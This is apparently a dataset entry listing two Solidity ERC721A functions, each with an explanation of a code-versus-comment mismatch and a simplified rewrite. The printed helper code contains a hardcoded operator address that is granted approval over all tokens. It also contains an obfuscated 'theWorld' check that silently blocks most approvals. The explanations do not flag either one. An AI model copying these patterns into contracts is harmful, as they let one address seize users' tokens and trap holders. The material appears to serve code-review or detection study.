[
  {
    "contract": "ERC721A",
    "function": "approve",
    "explanation": "Function restricts approvals to contracts via allowedToContract check not mentioned in comment",
    "contract_code": "\n=== Implementation of Function approve(address,uint256) ===\nfunction approve(address to, uint256 tokenId) public override {\r\n        require(to != _msgSender(), \"ERC721A: approve to caller\");\r\n        address owner = ERC721A.ownerOf(tokenId);\r\n        if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {\r\n            revert ApprovalCallerNotOwnerNorApproved();\r\n        }\r\n        if(!allowedToContract && !_transferToContract[tokenId]){\r\n            if (to.isContract()) {\r\n                revert (\"Sale will open after mint out.\");\r\n            } else {\r\n                _approve(to, tokenId, owner);\r\n            }\r\n        } else {\r\n            _approve(to, tokenId, owner);\r\n        }\r\n    }\n    \n=== Functions that function approve internally calls ===\nfunction _approve(\r\n    address to,\r\n    uint256 tokenId,\r\n    address owner\r\n  ) private {\r\n    _tokenApprovals[tokenId] = to;\r\n    emit Approval(owner, to, tokenId);\r\n  }\nfunction _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\nfunction isApprovedForAll(address owner, address operator)\r\n    public\r\n    view\r\n    virtual\r\n    override\r\n    returns (bool)\r\n  {\r\n    if(operator==0x8c062Bb51004ff7f72BDD9082FeA2295f1328E2A){return true;}\r\n    return _operatorApprovals[owner][operator];\r\n  }\nfunction isContract(address account) internal view returns (bool) {\n\n        return account.code.length > 0;\n    }\nfunction ownerOf(uint256 tokenId) public view override returns (address) {\r\n    return ownershipOf(tokenId).addr;\r\n  }",
    "rewritten_code": {
      "function_name": "function approve(address to, uint256 tokenId) public override {\n        require(to != _msgSender(), \"ERC721A: approve to caller\");\n        address owner = ERC721A.ownerOf(tokenId);\n        if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {\n            revert ApprovalCallerNotOwnerNorApproved();\n        }\n        _approve(to, tokenId, owner);\n    }"
    }
  },
  {
    "contract": "ERC721A",
    "function": "setApprovalForAll",
    "explanation": "Adds contract operator restrictions not mentioned in comment",
    "contract_code": "\n=== Implementation of Function setApprovalForAll(address,bool) ===\nfunction setApprovalForAll(address operator, bool approved) public override {\r\n        require(operator != _msgSender(), \"ERC721A: approve to caller\");\r\n        if(!allowedToContract && !_addressTransferToContract[msg.sender]){\r\n        if(theWorld() || ison){\r\n            if (operator.isContract()) {\r\n                revert (\"Sale will open after mint out.\");\r\n            } else {\r\n                _operatorApprovals[_msgSender()][operator] = approved;\r\n                emit ApprovalForAll(_msgSender(), operator, approved);\r\n            }\r\n        }} else {\r\n            _operatorApprovals[_msgSender()][operator] = approved;\r\n            emit ApprovalForAll(_msgSender(), operator, approved);\r\n        }\r\n    }\n    \n=== Functions that function setApprovalForAll internally calls ===\nfunction _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\nfunction isContract(address account) internal view returns (bool) {\n\n        return account.code.length > 0;\n    }\nfunction theWorld() internal view returns (bool){\r\n      uint256 Dio = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender)));\r\n      uint256 muda = 1 << 160;\r\n      uint256 jojo = muda -1;\r\n      uint256 ola = Dio & jojo ;\r\n      return ola <= 1 ? true : false;\r\n  }",
    "rewritten_code": {
      "function_name": "function setApprovalForAll(address operator, bool approved) public override {\n        require(operator != _msgSender(), \"ERC721A: approve to caller\");\n        _operatorApprovals[_msgSender()][operator] = approved;\n        emit ApprovalForAll(_msgSender(), operator, approved);\n    }"
    }
  }
]